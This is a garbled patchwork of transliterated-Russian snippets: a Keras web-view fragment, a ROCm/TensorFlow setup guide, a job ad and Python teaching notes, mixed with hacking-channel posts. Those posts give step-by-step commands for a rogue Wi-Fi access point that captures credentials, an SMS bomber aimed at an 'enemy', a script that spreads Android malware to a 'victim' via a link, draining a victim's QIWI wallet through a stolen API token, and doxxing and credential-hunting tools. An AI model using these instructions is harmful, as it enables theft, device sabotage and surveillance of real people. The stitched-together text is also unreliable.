graph_div = '' pred = '' red = request.POST['red'] dense = int(request.POST['dense']) epochs = int(request.POST['epochs']) batch = int(request.POST['batch']) #nodes = int(request.POST['categories']) if red == 'Binary Cross-Entropy': model= Sequential() model.add(Dense(dense, input_dim=dim, activation='relu')) model.add(Dense(dim, activation='relu')) model.add(Dense(1, activation='sigmoid')) model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) model.fit(x=X_train,y=y_train,batch_size=batch, epochs=epochs,shuffle=True) pred = model.predict(X_test) _, accuracy = model.evaluate(X_test, y_test) accu = (accuracy*100) resultados = [] for i in pred: resultados.append(i[0]) with open('/var/www/trainyourmodel/static/pred.csv', 'w', ) as myfile: wr = csv.writer(myfile, quoting=csv.QUOTE_ALL) for word in resultados: wr.writerow([word]) context = {'accu': accu, 'pred': pred} return render(request, "neural.html", context) if red == 'Mean Squared Error': model = Sequential() model.add(Dense(dense, input_dim=dim, activation='relu')) model.add(Dense(1, activation='linear')) model.compile(loss='mean_squared_error', optimizer='adam', metrics=['accuracy']) model.fit(x=X,y=y,batch_size=batch, epochs=epochs,shuffle=True) pred = model.predict(X_test) _, accuracy = model.evaluate(X_test, y_test) resultados = [] for i in pred: resultados.append(i[0]) with open('/var/www/trainyourmodel/static/pred.csv', 'w', ) as myfile: wr = csv.writer(myfile, quoting=csv.QUOTE_ALL) for word in resultados: wr.writerow([word]) accu = (accuracy*100) context =

Matritsa metrazha proizvedennoi produktsii po profiliam i po formatam predstavliaet soboi dvumernyi massiv A 6*6, kotoryi podrazdeliaetsia na dvumernyi massiv V p*f, gde p=5 - profil' gofry, f=5 - format, i odnomernye Zp - summa proizvedennykh metrov po profiliam gofry i Zf  -- summa proizvedennykh metrov po formatam. Sootvetstvenno matritsa Zp - odnomernaia matritsa iz 5-ti elementov, predstvaliaet soboi summu stolbtsov matritsy A, Zf - odnomernaia matritsa iz 5-ti elementov, predstvaliaet soboi summu strok matritsy A. Ostaetsia odin ne zapolnennyi element - a66, eta iacheika budet obshchei dlinoi proizvedennoi produktsii.

#Chtonovogo@openetu  #Nashformat@openetu    Uchashchiesia shkoly No. 255 goroda Sankt-Peterburga pristupili k izucheniiu onlain-kursa <<Razrabotka sistem raspoznavaniia obrazov dlia avtonomnykh servisnykh robotov>>, razrabotannogo inzhenerom kafedry SAU nashego universiteta Karinoi Moklevoi. Napomnim, chto eto kurs sovsem nedavno zanial vtoroe mesto v ramkakh mezhdunarodnogo konkursa EdCrunch Award 2020 v nominatsii <<Luchshii kurs v oblasti inzhenernogo obrazovaniia>>.    Komanda shkoly No. 255 uchastvuet v proekte Sirius-leto. Krome uchashchikhsia peterburgskoi shkoly v komandu proekta vkhodiat predstaviteli Moskvy i Surguta. Rebiata zanimaiutsia razrabotkoi platformy planetokhoda, osnashchennoi tekhnicheskim zreniem i spetsializirovannoi podveskoi. Apparatnaia platforma -- Raspberry PI i moduli na baze Arduino. Algoritmy tekhnicheskogo zreniia budut napisany na iazyke python3. V rabote ispol'zovany frezerovanie, additivnye i lazernye tekhnologii, izgotovlenie plat metodom LUT.    Uchite(s') v distantsionnom formate s nami   #tsnot_enot
Reshil napisat' seriiu statei, posviashchionnykh sozdaniiu bloga na flask'e

Vzliot iskusstvennogo intellekta priviol k populiarnosti platform mashinnogo obucheniia MLaaS. Esli vasha kompaniia ne sobiraetsia stroit' freimvork i razviortyvat' svoi sobstvennye modeli, est' shans, chto ona ispol'zuet nekotorye platformy MLaaS, naprimer H2O ili KNIME. Mnogie issledovateli dannykh, kotorye khotiat sekonomit' vremia, pol'zuiutsia etimi instrumentami, chtoby bystro prototipirovat' i testirovat' modeli, a pozzhe reshaiut, budut li ikh modeli rabotat' dal'she.

Sootvetstvenno matritsa Zp - odnomernaia matritsa iz 5-ti elementov, predstvaliaet soboi summu stolbtsov matritsy A, Zf - odnomernaia matritsa iz 5-ti elementov, predstvaliaet soboi summu strok matritsy A. Est' li zhizn' bez Nvidia? Zapuskaem TensorFlow na Radeon RX 580  Predystoriia  Na novom rabochem meste menia posadili za PK, oborudovannyi protsessorom Ryzen 2600 i videokartoi Radeon RX 580. Poprobovav obuchat' neironnye seti na protsessore, ia ponial, chto eto ne delo: uzh slishkom medlennym byl protsess. Posle nedolgikh poiskov ia uznal, chto sushchestvuet kak minimum 2 sposoba zapuska sovremennykh bibliotek mashinnogo obucheniia na videokartakh Radeon: PlaidML i ROCm. Ia poproboval oba i khochu podelit'sia rezul'tatami.  PlaidML: krossplatformennost' vo glave ugla  TensorFlow sluzhit bekendom dlia Keras, interpretiruia ego sintaksis i preobrazuia ego v instruktsii, kotorye mogut vypolniat'sia na protsessore ili GPU. K sozhaleniiu, on podderzhivaet tol'ko videokarty s tekhnologiei Nvidia CUDA.  PlaidML - al'ternativnyi bekend dlia Keras s podderzhkoi OpenCL. Ego mozhno ispol'zovat' dlia obucheniia modelei Keras vstroennoi grafike protsessora, diskretnom ili dazhe vneshnem graficheskom protsessore AMD. On rabotaet na Windows, Linux i Mac.  UPD: V svoiom kommentarii pol'zovatel' MikeLP ukazal, chto:  Keras zadumyvalsia kak vysokourovnevyi interfeis. Sootvetstvenno ostal'nye bekendy, kak PlaidML mogli obespechit' rabotu s drugimi videouskoriteliami bez zakrytoi tekhnologii CUDA. I tak bylo do tekh por, poka avtory ne zaiavili, chto Keras budet razvivat'sia tol'ko v ramkakh Tensorflow. Vse -- <<nakrylas' mednym tazom vasha kachalka>>. I poluchaetsia chto PlaidML mozhet rabotat' tol'ko s Keras, a ne s tf.Keras -- API razbezhalos'. Cootvetstvenno smysl iuzat' PlaidML, kogda on ne sovmestim s poslednei versiei Keras API v Tensorflow. Patsany iz PlaidML (oni chast' Intel) byli vynuzhdeny pomeniat' roadmap i idti v drugom napravlenii.  Po moemu mneniiu, PlaidML eshchio aktualen, t.k. vkliuchenie Keras v Tensorflow proizoshlo nedavno i API ne uspel sushchestveno pomeniat'sia. Odnako dal'sheishie perspektivy Keras+PlaidML vygliadiat tumanno.  Ustanovka PlaidML ochen' prosta. Nuzhno postavit' Python-paket i vybrat' ustroistvo v poshagovom konfiguratore:   pip install plaidml-keras && plaidml-setup   V kode nuzhno propisat' ispol'zovanie PlaidML kak bekenda:   os.environ["KERAS_BACKEND"] = "plaidml.keras.backend"   Posle etogo vse vychisleniia budut vypolniat'sia na videokarte. Zapustim benchmark:   plaidbench keras mobilenet   Sravnim rezul'taty nashego videoadaptera s nekotorymi drugimi. RX 580 i Ryzen 2600 ia testiroval lokal'no, rezul'taty ostal'nykh ustroistv vziaty ot drugikh pol'zovatelei:  Ustroistvo  Vremia kompiliatsii  Vremia ispolneniia  Radeon RX 580  6.14s  6.51s  Radeon Vega Frontier Edition  4.56s  5.50s  GeForce GTX 1080 TI  2.52s  4.83s  Intel HD Graphics 5500  36.64s  755.23s  AMD Ryzen 2600 (CPU)  5.04s  254.70s  Videoadaptery AMD pokazyvaiut sebia oshchutimo medlennee videokart Nvidia. Vprochem, razryv mezhdu videokartami na poriadok men'she propasti mezhdu videokartami i protsessorami. Iskliucheniem vystupaet Intel HD Graphics: PlaidML sovershenno ne optimizirovan dlia videokart Intel i ikh ispol'zovanie ne imeet osobogo smysla.  ROCm: Starshii brat  So svoei platformoi Radeon Open Compute Platform (ROCm), AMD obespechivaet interfeis dlia vypolneniia koda na GPU i protsessorakh. ROCm konkuriruet s platformoi NVIDIA CUDA. On rabotaet tol'ko na UNIX-sistemakh.  Na ispol'zovanii ROCm ia v itoge i ostanovilsia. Po moim oshchushcheniiam, on rabotaet v ~2 raza bystree, chem PlaidML, i pozvoliaet zagruzhat' v pamiat' bolee slozhnye modeli, kogda PlaidML vybrasyvaet Out Of Memory.  Ia ustanovil svezhuiu Ubuntu 20.04 LTS. Dlia ustanovki i nastroiki ROCm ia predprinial sleduiushchie shagi: (oni nemnogo otlichaiutsia ot ofitsial'noi dokumentatsii, t.k. ona uspela neskol'ko ustaret')  Obnovil pakety:   sudo apt update && sudo apt dist-upgrade && sudo apt install libnuma-dev && sudo reboot   Otkatil iadro s versii 5.8 do 5.6. Dlia etogo ia zashel na http://kernel.ubuntu.com/~kernel-ppa/mainline/ i skachal faily:   linux-headers-VERSION-NUMBER_all.deb linux-headers-VERSION-NUMBER_amd64.deb linux-image-VERSION-NUMBER_amd64.deb linux-modules-VERSION-NUMBER_amd64.deb   Dalee skopiroval ikh v otdel'nuiu papku, v kotoroi vypolnil:   sudo dpkg -i *.deb   Perezagruzil PK s iadrom 5.6, vybrav ego v GRUB. Posle etogo udalil iadro 5.8:   sudo apt-get purge *5.8.0*   Perezagruzil PK.  Dobavil repozitorii:   wget -q -O - https://repo.radeon.com/rocm/rocm.gpg.key | sudo apt-key add - echo 'deb [arch=amd64] https://repo.radeon.com/rocm/apt/debian/ xenial main' | sudo tee /etc/apt/sources.list.d/rocm.list   Ustanovil ROCm:   sudo apt update && sudo apt install rocm-dkms && sudo reboot   Nastroil prava:   sudo usermod -a -G video $LOGNAME sudo usermod -a -G render $LOGNAME   Dlia proverki uspeshnosti ustanovki zapustil eti komandy. Esli ustanovka proshla uspeshno, obe iz nikh vyvedut nazvanie GPU:   /opt/rocm/bin/rocminfo /opt/rocm/opencl/bin/clinfo   Dobavil ROCm v PATH:   echo 'export PATH=$PATH:/opt/rocm/bin:/opt/rocm/rocprofiler/bin:/opt/rocm/opencl/bin' | sudo tee -a /etc/profile.d/rocm.sh   Posle etogo ustanovil pakety dlia mashinnogo obucheniia:   sudo apt install rocm-libs miopen-hip rccl   Ustanovil Pip i TensorFlow:   sudo apt install python3-pip pip3 install --user tensorflow-rocm   Gotovo! Posle etogo TensorFlow avtomaticheski stal ispol'zovat' moi GPU:  Davaite posmotrim na benchmarki:   python3 ./tf_cnn_benchmarks.py --num_gpus=1 --batch_size=64 --model=resnet50   RX 580 ia testiroval lokal'no, rezul'taty ostal'nykh ustroistv vziaty ot drugikh pol'zovatelei:  Ustroistvo  Izobrazhenii/sek (ResNet 50)  AMD Radeon VII  284  AMD Radeon RX Vega 56  131  AMD Radeon RX 580  92  Nvidia GeForce 2080 Ti  293  Nvidia GeForce GTX 1070  126  Nvidia GeForce RTX 3080 10GB  396  Vyvody  V 2021 godu v sfere mashinnogo obucheniia stanovitsia vsio menee i menee vazhno, kakaia u vas videokarta. Videokarty AMD vsio eshchio oshchutimo otstaiut v proizvoditel'nosti ot sobrat'ev iz Nvidia, odnako pri etom i stoiat deshevle. Tem ne menee, podderzhka videokart Radeon daleka ot ideal'noi, i neobkhodimaia nastroika dlia nikh slozhnee i dol'she.  Esli u vas uzhe est' videokarta ot AMD, to vozmozhno dlia tselei razrabotki vam ne ponadobitsia meniat' eio na videokartu Nvidia. Optimal'nym vyborom dlia mashinnogo obucheniia na videokartakh Radeon ia schitaiu freimvork ROCm. On obespechivaet prilichnuiu proizvoditel'nost', i pozvoliaet zapustit' TensorFlow 2.2.0 i Keras.  #mashinnoeobuchenie, #machinelearning, #ML

Sourceleahacker -- eto spetsial'nyi instrument dlia analiza na utechku informatsii tselevogo resursa.    Otkryvaem terminal Kali linux i pishem sleduiushchie komandy:     apt-get update && apt-get upgrade     apt-get install python3-coloredlogs python3-prettytable python3-contextlib2     git clone https://github.com/WangYihang/SourceLeakHacker.git     cd SourceLeakHacker     pip install -r requirments.txt    Ispol'zovanie:     python3 SourceLeakHacker.py --url= &ltURL-adres tselevogo saita>    Khaking v khatu

A tool to hunt for credentials in the GitHub wild AKA git*huntGetting started    Install the tool  Configure your GitHub token  Search for credentials  See results cat results.json | jq     Installation    requirements:     virtualenv, python3      git clone https://github.com/d1vious/git-wild-hunt && cd git-wild-hunt clone project and cd into the project dir  pip install virtualenv && virtualenv -p python3 venv && source venv/bin/activate && pip install -r requirements.txt create virtualenv and install requirements    Continue to configuring a GitHub API key  Configuration git-wild-hunt.confMake sure you set a GitHub token if you need to create one for your account follow these instructions. Na novom rabochem meste menia posadili za PK, oborudovannyi protsessorom Ryzen 2600 i videokartoi Radeon RX 580. Poprobovav obuchat' neironnye seti na protsessore, ia ponial, chto eto ne delo: uzh slishkom medlennym byl protsess. Posle nedolgikh poiskov ia uznal, chto sushchestvuet kak minimum 2 sposoba zapuska sovremennykh bibliotek mashinnogo obucheniia na videokartakh Radeon: PlaidML i ROCm. Ia poproboval oba i khochu podelit'sia rezul'tatami.
Python3, FastAPI, Muru, PostgreSQL, JSONAPI, k8s, Docker.

Nash partner Sber ishchet talantlivykh razrabotchikov, kotorym predstoit reshat' prikladnye zadachi obrabotki zaprosov na estestvennom iazyke (NLP).   SberDevices -- unikal'noe IT-prostranstvo vnutri Sberbanka. My zanimaemsia razrabotkoi smartappov i stsenariev dlia nashikh umnykh ustroistv, podderzhivaiushchikh golosovogo assistenta Saliut i semeistvo virtual'nykh personazhei. V rabote my ispol'zuem sovremennye tekhnologii, privetstvuem v komande liubye interesnye idei i kazhdye igrok komandy mozhet vlozhit' v ustroistvo chto-to svoe.   Trebuemyi opyt raboty: 3-5 let  Polnaia zaniatost', polnyi den'     Zadachi:  * Reshenie prikladnykh i produktovykh zadach NLP na nashikh freimvorkakh (smart_app_ide, nlpf)  * Realizatsiia produktovoi logiki smartappa  * Vzaimodeistvie s drugimi servisami posredstvom razlichnykh API  * Vzaimodeistvie s zakazchikami, analitikami, spetsialistami Data Science  * Podderzhka sobstvennogo mikroservisa, uchastie v reliznom protsesse      Nashi ozhidaniia:  * Vladenie Python3 na uverennom urovne, dostatochnom dlia promyshlennogo programmirovaniia  * Khoroshie znaniia algoritmov  * Umenie pisat' testy, znakomstvo s podkhodom TDD  * Samostoiatel'nost', umenie analizirovat' i strukturirovat' trebovaniia, dekompozirovat' zadachi  * Zhelanie razbirat'sia v produkte v tselom, a ne tol'ko v svoem kode  * Umenie konstruktivno vzaimodeistvovat' v gorizontal'nykh komandakh, sostoiashchikh iz razrabotchikov, menedzherov, analitikov, dizainerov  * Gotovnost' razrabatyvat' po metodologiiam Agile      Budet pliusom:  * Znanie tekhnologii NLP, osnov Data Science  * Opyt raboty s Django, reliatsionnymi BD (Postgres)  * Znanie Javascript  * Znanie Git, Docker  * Opyt raboty s Apache Kafka  * Znanie instrumentov DevOps  * Opyt raboty v krupnykh kompaniiakh   Kontaktnoe litso: Ekaterina Pshekhotskaia, telegram @pshehotsky.

Kak mozhno otsenit' nastoichivuiu pobudku vtoroklassnikom chasov v 7 utra voskresen'ia so slovami <<Papa! Poidem uchit' Python>>? Bestsenno. Nazrelo zhelanie podelit'sia narabotkami domashnego obucheniia detei programmirovaniiu -- sistematizirovat' i zakonspektirovat' khotia by dlia samogo sebia. Dazhe ne stol'ko obucheniiu, skol'ko privlecheniia detskogo vnimaniia i interesa. Ved' soglasno Sokratu, chelovek -- ne sosud dlia zapolneniia, a fakel, kotoryi nuzhno zazhech'. Iznachal'no byli popytki nachat' so Scratch, no nesmotria na poniatnyi graficheskii interfeis zhelanie prodolzhat' i chto-to delat' v srede bystro ugaslo. Minecraft poshel namnogo luchshe, potomu chto deti uzhe byli khorosho znakomy s igroi po mobil'noi versii i liubimomu creative mode.
#Abuze AbuzeTime na sviazi!  Nachnem den' s Abuza po DDOS saitov!  S pomoshch'iu etoi stat'i vy smozhete nakryvat' saity na nekotoroe (a mozhet i neogranichennoe) vremia. Zhelaem uspekhov!

Little Brazzer)    Instrument dlia sbora informatsii    LittleBrother - eto instrument dlia sbora informatsii (OSINT), tsel'iu kotorogo iavliaetsia provedenie issledovaniia o frantsuzskom, shveitsarskom, liuksemburgskom ili bel'giiskom cheloveke. On predostavliaet razlichnye moduli, obespechivaiushchie effektivnyi poisk. LittleBrother ne trebuet kliucha API ili identifikatora vkhoda.    Ustanovka v Termux:     apt install git python3   git clone https://github.com/Lulz3xploit/LittleBrother   pip install -r requirements.txt   pip install requests   pip install bs4   pip install colorama   pip install terminaltables    Ispol'zovanie:   cd LittleBrother   python3 LittleBrother.py    Ustanovka v Linux:    Vy dolzhny imet' git i python3 ustanovit' na svoi komp'iuter     sudo apt install git python3 &&  git clone https://github.com/Lulz3xploit/LittleBrother && cd LittleBrother && python3 -m pip install -r requirements.txt    Sreda vypolneniia Linux  V kataloge LittleBrother vypolnite etu komandu, chtoby zapustit' LittleBrother:     python3 LittleBrother.py     Github (https://github.com/Lulz3xploit/LittleBrother)   Skrinshoty (https://imgur.com/a/EdZnC1V)

Vse delaiut eto. Nu ladno, ne vse, no bol'shinstvo. Pishut skripty, chtoby simulirovat' svoi proekty na Verilog, SystemVerilog i VHDL. Odnako, napisanie i podderzhka takikh skriptov chasto byvaet dovol'no neprosta dlia tipichno ispol'zuemykh Bash/Makefile/Tcl. Osobenno, esli neobkhodimo ne tol'ko otkryvat' GUI dlia odnogo testbencha i smotret' v diagrammy, no i zapuskat' pachki parametrizirovannykh testov dlia razlichnykh blokov, kontrolirovat' rezul'tat, parallelizirovat' ikh vypolnenie i t.d. Okazalos', chto vsio eto mozhno zakryt' dovol'no prozrachnym i legko podderzhivaemym kodom na Python, chto mne dazhe obidno stanovitsia ot togo, kak ia stradal ranee i skol'ko strannogo bash-koda rodil.

Sozdaem tochku dostupa Wi-Fi dlia perekhvata dannykh   Vsem privet. Kazhdyi den' my nemalo vremeni provodim v seti, ved' internet v nashe vremia pozvoliaet potrebliat' ogromnoe kolichestvo informatsii, daet rabotu i v tselom uproshchaet nashu zhizn'. Predstav'te situatsiiu, kogda nuzhno srochno vyiti v set', no mobil'nyi internet ne lovit ili zhe poprostu zakonchilsia.   K sozhaleniiu, mnogie liudi v takikh situatsiiakh nachinaiut iskat' nezashchishchennye tochki dostupa, tem samym podvergaiut svoi dannye ogromnoi opasnosti, tak kak ochen' chasto nezaparolennaia "obshchestvennaia" Wi-Fi set' okazyvaetsia tochkoi dostupa dlia perekhvata dannykh. Vse dannye, kotorye vvedet chelovek, podkliuchennyi k takoi seti, otpravit'sia napriamuiu k moshenniku.  Predlagaiu vam proverit', kak rabotaet eta sistema iznutri i sozdat' svoiu tochku dlia perekhvata dannykh.  Ustanovka: apt install python3.7-dev libssl-dev libffi-dev build-essential python3.7 git clone https://github.com/P0cL4bs/wifipumpkin3.git cd wifipumpkin3 apt install python3-pyqt5 python3 setup.py install  Ispol'zovanie: wifipumpkin3 -- zapusk utility  Posle zapuska u vas otkroetsia interfeis wifi-pumkin. Pereidite vo vkladku Setting i daite imia svoe tochke dostupa. Dalee v Activity Monitor settings stav'te galochki na HTTP-Requests (veb-zaprosy), HTTP-Authentication (uchiotnye dannye s veb-saitov) i Pumpkin-Proxy. Vo vkladke Plugins (plaginy) vyberite, chto vam vazhnee. Pumpkin-Proxy pozvoliaet ispol'zovat' razlichnye gotovye resheniia (keilogery, BeEF, vnedrenie koda i t.d.) Zato SSLStrip+ v pare s dns2proxy pozvoliaiut obkhodit' HTTPS i perekhvatyvat' namnogo bol'she uchiotnykh dannykh.

Vsem privet! [tt] Segodnia my rassmotrim ustanovki skripta, kotoryi ishchet informatsiiu ob akkaunte Instagram.Dlia nachala skachivaem Termux. Vpisyvaem eti komandy:  Ustanovka:    apt update   apt upgrade   apt install git   apt install python    git clone https://github.com/th3unkn0n/osi.ig.git && cd osi.ig   Zapusk:   pip install -r requirements.txt   python3 main.py -u username   python3 main.py -h -p, --post images info highlight  Instagram OSINT poluchaet iz uchetnoi zapisi Instagram razlichnuiu informatsiiu, kotoruiu vy obychno ne mozhete poluchit', prosto prosmotrev ikh profil'. Informatsiia vkliuchaet: profil': identifikator pol'zovatelia, podpischiki / podpischiki, kolichestvo zagruzok, URL-adres img profilia, biznes-perechislenie, vneshnii URL-adres, nedavno prisoedinilsia i t. d. tegi i upominaniia: naibolee chasto ispol'zuemye kheshtegi i upomianutye akkaunty. elektronnaia pochta: esli kakoi-libo adres elektronnoi pochty ispol'zuetsia v liubom meste, gde on budet otobrazhat'sia soobshcheniia: zagolovok dostupnosti, mestopolozhenie, otmetka vremeni, zagolovok, URL izobrazheniia i t. d. (no ne rabotaet pravil'no s postami Instagram, pomechennymi kak  chuvstvitel'nyi kontent '') Podpishis',i priglashai druzei

XSS (Cross Site Scripting) -- odin iz samykh populiarnykh vidov veb-uiazvimostei, pozvoliaiushchii proizvodit' vnedrenie vredonosnogo koda v otdavaemuiu veb-prilozheniem stranitsu. Ataki s ispol'zovaniem XSS-vektora pozvoliaiut vnedriat' na stranitsu proizvol'noe soderzhimoe, perekhvatyvat' cookie i sessii drugikh pol'zovatelei, poluchat' dostup v zakrytye razdely saita i dazhe privilegii administratora veb-resursa.

A chto, esli my vam skazhem, chto sushchestvuet massa neofitsial'nykh Python interpretatorov, kotorye reshaiut raznye zadachi? Esli udivleny, to rekomenduem oznakomit'sia so stat'ioi.  #python_podborka@pylounge #programming@pylounge #tools@pylounge

ProtOSINT is a Python script that helps you investigate ProtonMail accounts and ProtonVPN IP addresses.DescriptionThis tool can help you in your OSINT investigation on Proton service (for educational purposes only).ProtOSINT is separated in 3 sub-modules:    [1] Test the validity of one protonmail account  [2] Try to find if your target have a protonmail account by generating multiple adresses by combining information fields inputted  [3] Find if your IP is currently affiliate to ProtonVPN    PrerequisitePython 3  Usage  python3 protosint.py  ProtonmailThe account name in the protonmail is case-insensitive and ProtonMail considers the "." "_" "-" symbols as transparent.Additionnaly, any words put after a "+" sign are not taken into account.It means that all of these email adresses below are the same as [email protected] :      All of these emails have the save timestamp and refers to the account [email protected]    Furthermore, this technique does not always give you the creation time and date of the ProtonMail account itself, but the time and date when the email address itself was created (thanks to @sector035 for the tip : https://sector035.....

Zdravstvuite, budu rad absoliutno liuboi pomoshchi!  Proshu, ne vmeniat' mne moi orfograficheskie(i inye) oshibki, ibo s telefona pechatat' ia ne umeiu. Itak k suti:  OS: ubuntu 20.04(paralel'no ustanovlena win10)  Zagruzchik: grub  Videokarta: gtx 1050, tak zhe imeiu vstroiku: intel uhd 630  Situatsiia proizoshla sleduiushchaia: Vykliuchil noutbuk(model' v dannom kontekste ne vazhna), a po prikhodu obnaruzhil to, chto linux zagruzhaetsia s proverkoi failovoi sistemy(rasprostranennaia bolezn' ext4)(chto vazhno - windows rabotaet v shtatnom rezhime). (ctrl+alt+f1 rabotaet). Dlia tekh kto ne imeet predstavleniia ob etoi proverke, foto prikrepil nizhe(prostite, no kak vy poniali, skrinshot ia sdelat' ne mogu).  Dannomu bespredelu predshestvovali:  ~ 2 chasa kodinga(noutbuk peregret'sia ne mog, po prichine togo chto rabotal s malen'kim python proektom, k tomu zhe v sublime text 3(dlia tekh komu eto nichego ne govorit, ochen' liogkaia dlia noutbuka dazhe na pentiume zadacha) - obnovlenie draivera nvidii(s 450 versii do 455, draiver byl ustanovlen proprietarnyi) - Udalenie python(3.8.2), i ustanovka nachisto python3.9 (i kak sledstvie vsekh nuzhnykh mne bibliotek) - Vykliuchenie(po posleduiushchemu vkliucheniiu uzhe nachalis' problemy)  Kakie resheniia ia uzhe isproboval(ni odno ne imelo rezul'tata): 1. Prosto ozhidat' okonchaniia proverki failovoi sistemy(~1 chas) 2. Udalenie i ustanovka nachisto draivera nvidii(t.k. takaia situatsiia mozhet byt' vyzvana konfliktom draiverov) 3. Proverka tselostnosti failovoi sistemy(iz-pod. Windows, (vse v norme)  Proshu otnestis' adekvatno, i ne predlagat' varianty v dukhe: a na koi tebe etot Linuks , vot ostav' bogopodobnuiu Vindu i vsio.... (unix lichno dlia menia, bolee predpochtitelen)  Vsem dobra!  *Rasshifrovka teksta s foto snizu: "Oshibok ne obnaruzheno"(eto esli sil'no uproshchionno)- chto podtverzhdaet chto s ssd vse v norme. #ugadaika@murkmurkov

Znaia, kak nelegko prikhoditsia novichkam v osvoenii novogo iazyka, [club165100725|NOP::Nuances of programming] gotovy predlozhit' pomoshch' v izuchenii takikh kontseptsii Python, kak virtual'naia sreda, interpoliatsiia strok, otlozhennye vychisleniia i generatory spiskov, slovarei i mnozhestv.   #python_podborka@pylounge #programming@pylounge

Vo vremia obucheniia deti pishut na python3 v standartnoi IDLE do temy while vkliuchitel'no, potom ustanavlivaiut redaktor koda.    Chtoby pereiti k sozdaniiu slozhnykh i real'nykh proektov, ucheniki dolzhny osnovatel'no proiti bazu. Na kazhduiu temu vypolnit' bol'shoe kolichestvo prakticheskikh zadanii raznoi slozhnosti:    1. Vvod i vyvod dannykh: poniatie peremennoi, tipy dannykh, funktsii print(sep, end) i input, formatirovanie strok  2. Matematika: arifmeticheskie operatsii, tselochislennoe delenie, ostatok ot deleniia, okruglenie  3. Usloviia: if-elif-else, tip dannykh bool, operatory sravneniia, logicheskie operatory  4. Tsikl while: while, break, continue, else, beskonechnyi tsikl  5. Stroki: srezy, metody find, rfind, replace, lower, upper, isdigit, isalpha ect.  6. Reguliarnye vyrazheniia  7. Tsikl for: for i in range, for i in list, else  8. Spiski: generatory spiskov, metody split i join, sort, max, min s ispol'zovaniem key  9. Funktsii: parametry, vozvrashchaemyi rezul'tat, rekursiia, oblast' vidimosti peremennykh, lambda  10. Obrabotka iskliuchenii: try, except, finally, else  11. Slovari i kortezhi: sozdanie slovaria, perebor elementov slovaria  12. Mnozhestva: sozdanie mnozhestv, operatsii so mnozhestvami  13. Dvumernye massivy: sozdanie vlozhennykh massivov, generator dvumernykh massivov, poisk diagonalei, razvorot massiva  14. Moduli: importirovanie modulei, moduli random, datetime, time, math  15. Tkinter: sozdanie okna, nastroika i upakovka vidzhetov, funktsii v tkinter, messagebox, filedialog  16. Tkinter: risovanie s pomoshch'iu Canvas, metod bind  17. Rabota s failami: zapis' i chtenie failov, serializatsiia i deserializatsiia s pomoshch'iu biblioteki pickle  18. OOP: klassy i ob'ekty, konstruktor, nasledovanie, polimorfizm, inkapsuliatsiia    Takzhe deti znakomiatsia s graficheskoi bibliotekoi Pygame. Detiam nravitsia delat' igry, tak chto eto otlichnyi variant dlia nikh :)  Ispol'zuia pygame, mozhno sozdavat' krasochnye i slozhnye proekty. Deti odnovremenno budut uchit'sia i naslazhdat'sia svoimi proektami.
Prodolzhaiu publikatsiiu reshenii otpravlennykh na doreshivanie mashin s ploshchadki HackTheBox (https://www.hackthebox.eu). Nadeius', chto eto pomozhet khot' komu-to razvivat'sia v oblasti IB.

See years range inside longtongue.py-n, --numbers  Add also numbers at password. Seichas nasha sistema umeet: 1) Analizirovat' effektivnost' lichnykh prodazh postavshchikov 2) Formirovat' rekomendatsii po optimizatsii postavok, raboty s assortimentov 3) Kompleksno analizirovat' konkurentov 4) Nakhodit' novye tovarnye nishi i mnogoe drugoe V planakh bol'shoi beklog interesnykh zadach po razvitiiu produkta, v t.ch. podkliuchenie novykh marketpleisov. Kogda zashli v prilozhenie, vvodim sleduiushchie komandy:  Apk update Apk upgrade Apk add git python3 Pip3 install requests git clone https://github.com/termux-lab/smsham.git cd smsham python3 smsham.py  Zhdem zagruzki i nas poprosiat vvesti nomer telefona. Ubivaem telefon svoemu nedrugu  Stat'ia napisana s poznavatel'noi tsel'iu i ne prizyvaet k zapreshchennym zakonodatel'stvom deistviiam, a takzhe ne sozdaet propagandy. Liubye deistviia, opisannye nizhe, vymyshleny.  Infect -- eto bash-skript, s pomoshch'iu kotorogo vy mozhete rasprostraniat' virus dlia android, otpravliaia spetsial'nuiu vredonosnuiu ssylku.  Ustanovka i ekspluatatsiia Otkryvaem terminal i vvodim komandu dlia obnovleniia paketov:  pkg update && pkg upgrade  Ustanavlivaem git i python s pomoshch'iu komand:  pkg install git  pkg install python2  pkg install python3  Ustanavlivaem lolcat:  pip install lolcat  Kloniruem repozitorii s GitHub:  git clone https://github.com/noob-hackers/Infect  Perekhodim v papku instrumenta:  cd Infect  I zapuskaem:  bash infect.s  Posle zapuska vybiraem pervyi punkt. Dalee soglashaemsia so vsem, nazhimaia tri raza podriad Enter. V konechnom itoge sozdastsia vredonosnaia ssylka, kotoruiu nuzhno otpravit' nashei zhertve. Kogda zhertva pereidet po dannoi ssylke, na ustroistvo skachaetsia fail pod nazvaniem System Update.apk Esli zhertva ustanovit i zapustit fail, to telefon zhertvy budet zarazhen virusom Elite, kotoryi ne pozvolit vospol'zovat'sia ustroistvom.

Kradem den'gi s QIWI-koshel'ka  SimpleQIWI -- skript dlia osushchestvleniia denezhnykh tranzaktsii v platezhnoi  sisteme QIWI, ispol'zuia API QIWI-koshel'ka.    Sluzhba podderzhki platezhnoi sistemy QIWI zaiavliaet, chto pri pomoshchi API-kliucha  mozhno sovershat' nad koshel'kom sleduiushchie deistviia:  Prosmatrivat' podrobnuiu informatsiiu o koshel'ke. Poluchat' balans koshel'ka. Prosmatrivat' istoriiu platezhei. Provodit' platezhi bez podtverzhdeniia po SMS. Esli zloumyshlennik poluchit dostup k API-kliuchu zhertvy, to zloumyshlenniku  otkryvaetsia prakticheski polnyi dostup k koshel'ku.  Ustanovka i ekspluatatsiia Otkryvaem terminal i vvodim komandu dlia obnovleniia paketov: sudo apt-get update && apt-get upgrade  Ustanavlivaem python3: sudo apt-get install python3-pip -y  Ustanavlivaem git s pomoshch'iu komandy: sudo apt-get install git  Dalee kloniruem repozitorii instrumenta s GitHub: git clone https://github.com/Emberium/SimpleQIWI  Perekhodim v direktoriiu utility: cd SimpleQIWI  Posle ustanovki dostatochno budet vnesti nekotorye pravki v skripte, chtoby s  pomoshch'iu instrumenta obnulit' chuzhoi balans QIWI-koshel'ka.  Soderzhanie skripta:  from SimpleQIWI import *  token = "VASh TOKEN"    # https://qiwi.com/api  phone = "VASh TELEFON"  api = QApi(token=token, phone=phone)  print(api.balance)  api.pay(account="TELEFON POLUChATELIa", amount=1, comment='Privet  mir!')  print(api.balance)

